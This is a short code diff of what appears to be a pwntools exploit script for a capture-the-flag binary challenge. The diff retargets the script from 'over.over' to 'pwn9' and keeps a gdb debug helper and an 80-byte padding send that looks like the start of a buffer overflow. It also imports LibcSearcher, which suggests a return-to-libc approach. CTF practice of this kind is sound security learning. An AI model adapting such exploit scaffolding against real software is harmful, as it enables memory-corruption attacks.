@@ -1,13 +1,13 @@
 from pwn import *
 from LibcSearcher import *
 
-context.binary = "./over.over"
+# context.binary = "./pwn9"
 
 def DEBUG(cmd):
     gdb.attach(io, cmd)
 
-io = process("./over.over")
-elf = ELF("./over.over")
+io = process("./pwn9")
+elf = ELF("./pwn9")
 
 # DEBUG("b *0x4006B9\nc")
 io.sendafter(">", 'a' * 80)
